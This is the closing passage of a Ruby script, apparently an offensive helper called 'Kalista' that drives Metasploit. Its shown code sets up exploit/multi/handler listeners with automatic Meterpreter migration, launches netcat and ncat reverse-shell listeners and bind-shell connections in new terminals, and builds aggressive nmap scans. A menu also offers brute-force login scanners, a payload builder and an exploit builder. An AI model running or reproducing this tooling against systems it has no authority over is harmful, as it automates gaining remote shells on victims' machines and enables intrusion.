                                                    givemeshell="xterm -title 'NetCat Connection #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nc -v #{zIP} #{zPORT}'\""
                                                    puts "Launching NetCat Connection to Binded Shell at #{zIP} on Port #{zPORT} in new x-window......"
                                                    break
                                            else
                                                    puts
                                                    puts "Please Enter a Valid Option!"
                                                    puts
                                    end
                            end
                    end
            else #Its a reverse shell....
                    puts "Please provide PORT to listen on: "
                    zPORT=gets.chomp
                    puts
                    if not payload == 'generic/reverse_shell'
                            puts "Launching MSF Exploit/Multi/Handler Listener for #{payload} on Port #{zPORT} in a new x-window....."
                            f.puts 'use exploit/multi/handler'
                            f.puts "set PAYLOAD #{payload}"
                            f.puts 'set LHOST 0.0.0.0'
                            f.puts "set LPORT #{zPORT}"
                            f.puts 'set ExitOnSession false'
                            if payload =~ /meterpeter/
                                    f.puts 'set AutoRunScript migrate -f'
                            end
                            if payload =~ /vncinject/
                                    f.puts 'set DisableCourtesyShell true'
                            end
                            f.puts 'exploit -j -z'
                            f.close
                            givemeshell="xterm -title 'MSF Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                    else
                            puts "Generic Reverse Shell Selected!"
                            while(true)
                                    puts "Select how to catch: "
                                    puts "1) Ncat"
                                    puts "2) NetCat"
                                    answer=gets.chomp
                                    if answer.to_i == 1
                                                    givemeshell="xterm -title 'Ncat Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ncat -lv #{zPORT}'\""
                                                    puts "Launching Ncat Listener on Port #{zPORT} in new x-window......"
                                                    break
                                    elsif answer.to_i == 2
                                                    givemeshell="xterm -title 'NetCat Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nc -l -v -p #{zPORT}'\""
                                                    puts "Launching NetCat Listener on Port #{zPORT} in new x-window......"
                                                    break
                                            else
                                                    puts
                                                    puts "Please Enter a Valid Option!"
                                                    puts
                                    end
                            end
                    end
            end
     
            #Spawn our listener in a separate terminal cause its nicer that way!!!!!
            fireNforget(givemeshell)
            puts
            @xcount = @xcount.to_i + 1
            main_menu
    end
     
    #NMAP Scan Builder
    def nmap_builder
            cls
            puts
            puts "Welcome to the Quick & Dirty NMAP Scan Builder"
            puts
            puts
            puts "Please provide target IP or Host to Scan: "
            target = gets.chomp
            puts
            scan="xterm -title 'NMAP Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nmap -sS -A -T3 -PN "
            puts "Enable NSE Scripts (Y/N)?"
            answer=gets.chomp
            if answer.upcase == 'YES' or answer.upcase == 'Y'
                    scan += '-sC '
            end
            scan += "#{target}'&& echo && echo '-- Press ENTER to close window --' && read\""
            puts "Launching NMAP Scan in seperate x-window, hope you find something interesting...."
            puts
            fireNforget(scan)
            @xcount = @xcount.to_i + 1
            puts
            main_menu
    end
     
    def updater
            puts
            puts "Launching Metasploit Updater, hang tight......"
            system("#{MSFPATH}/msfupdate 2> /dev/null")
            puts
            puts "OK, should be all set now!"
            puts
            puts "Press ENTER to Continue......"
            fuqoff=gets
            main_menu
    end
     
    def main_menu
            puts
            puts "Please select option to run from Main Menu: "
            puts "c) Clear Terminal"
            puts "q) Quit & Exit Completely"
            puts "n) Run Simple NMAP Scan"
            puts "s) Login Scanners"
            puts "b) Build Payloads"
            puts "l) Setup Connection Handler & Listeners"
            puts "x) Exploits & Helpers"
            puts "u) Update Metasploit"
            puts
     
            prompt = "(OWS: Kalista)> "
            while line = Readline.readline("#{prompt}", true)
                    cmd = line.chomp
                    case cmd
                            when /^c$|^clear$/i
                                    cls
                                    banner
                                    main_menu
                            when /^exit$|^quit$|^q$/i
                                    puts
                                    puts "OK, exiting now...."
                                    puts
                                    if File.exists?("#{Dir.pwd}/msfassist.rc") then FileUtils.rm("#{Dir.pwd}/msfassist.rc") end;
                                    exit 69;
                            when /^s$|^brute|^login/i
                                    cls
                                    banner
                                    crackers_N_bruters
                                    puts
                                    main_menu
                            when /^b$|^build$/i
                                    cls
                                    banner
                                    payload_builder
                                    puts
                                    main_menu
                            when /^l$|^listen|^setup/i
                                    cls
                                    banner
                                    puts
                                    listener_builder
                                    main_menu
                            when /^n$|^nmap$/i
                                    cls
                                    banner
                                    nmap_builder
                                    puts
                                    main_menu
                            when /^u$|^update$/i
                                    cls
                                    banner
                                    updater
                                    puts
                                    main_menu
                            when /^x$|^exploit/i
                                    cls
                                    banner
                                    puts
                                    exploit_builder
                                    main_menu
                            else
                                    cls
                                    banner
                                    main_menu
                    end
            end
    end
     
    ##
    ##### #
    ####### #### # ##
    ###### ########### #### #
    ######################### ### # #
    ########## ############################ # # #
    #Options passed as arguments when run get captured and parsed to make the magic happen :p
    options = {}
    optparse = OptionParser.new do |opts|
            opts.banner = "Usage:#{$0} [OPTION]"
            opts.separator ""
            opts.separator "EX: #{$0} --menu"
            opts.separator "EX: #{$0} --nmap"
            opts.separator "EX: #{$0} --brute"
            opts.separator "EX: #{$0} --build"
            opts.separator "EX: #{$0} --listener"
            opts.separator "EX: #{$0} --exploit"
            opts.separator "EX: #{$0} --update"
            opts.separator "EX: #{$0} --help"
            opts.separator ""
            opts.separator "Options: "
            #Now setup and layout Options....
            opts.on('-m', '--menu', "\n\tMain Menu") do |nothing|
                    options[:method] = 6 #6 => Main Menu......
            end
            opts.on('-n', '--nmap', "\n\tSimple NMAP Scanner") do |nothing|
                    options[:method] = 4 #4 => Run NMAP......
            end
            opts.on('-c', '--brute', "\n\tBruteforcer||Login Scanners") do |nothing|
                    options[:method] = 7 #7 => Run Bruter/Crackers Builder......
            end
            opts.on('-b', '--build', "\n\tPayload Builder") do |nothing|
                    options[:method] = 1 #1 => Run Payload Builder......
            end
            opts.on('-l', '--listener', "\n\tSetup Listener & Connection Handler") do |nothing|
                    options[:method] = 3 #3 => Run Listener......
            end
            opts.on('-x', '--exploit', "\n\tExploit Builder") do |nothing|
                    options[:method] = 2 #2 => Run Exploit Builder......
            end
            opts.on('-u', '--update', "\n\tUpdate Metasploit") do |nothing|
                    options[:method] = 5 #5 => Run UPDATE......
            end
            #Establish help menu           
            opts.on('-h', '--help', "\n\tHelp Menu") do
                    cls
                    banner
                    puts
                    puts opts #print opts outlined above for help
                    puts
                    exit 69; # :)
            end
    end
     
    begin #Start a begin block so we can rescue if needed (missing arguments, etc)
            foo = ARGV[0] || ARGV[0] = "-h" # If no arguments passed, set to the same as '-h' to show usage menu ;)
            if ARGV.size > 1
                    ARGV[0] = "-h"
            end
            optparse.parse!
     
            mandatory = [:method] #set mandatory option to ensure options chosen at run time
            missing = mandatory.select{ |param| options[param].nil? }  #check which options are missing @values, i.e. nil
            if not missing.empty? #If there are missing options print them
                    puts "Missing options: #{missing.join(', ')}"  
                    puts optparse
                    exit
            end
    rescue OptionParser::InvalidOption, OptionParser::MissingArgument  #catch errors instead of straight exiting
            cls #screen
            puts $!.to_s # Friendly output when parsing fails from bad options or no options
            puts
            puts optparse #show correct options
            puts
            exit 666 #freak out exit code, cause something went wrong    
    end
     
    cls
    banner
    puts
    @xcount=1 #tracker for xterm shells fired off (for placement sake)
    case options[:method]
            ##### FIND ADMIN PAGE(S) #####
            when options[:method] = 1
                    payload_builder
            when options[:method] = 2
                    exploit_builder
            when options[:method] = 3
                    listener_builder
            when options[:method] = 4
                    nmap_builder
            when options[:method] = 5
                    updater
            when options[:method] = 6
                    main_menu
            when options[:method] = 7
                    crackers_N_bruters
            else
                    puts
                    puts "No usable method found! You really, really shouldn't be here right now!"
                    puts "Good Bye!"
                    puts
                    puts
                    exit 666;
    end
    #EOF

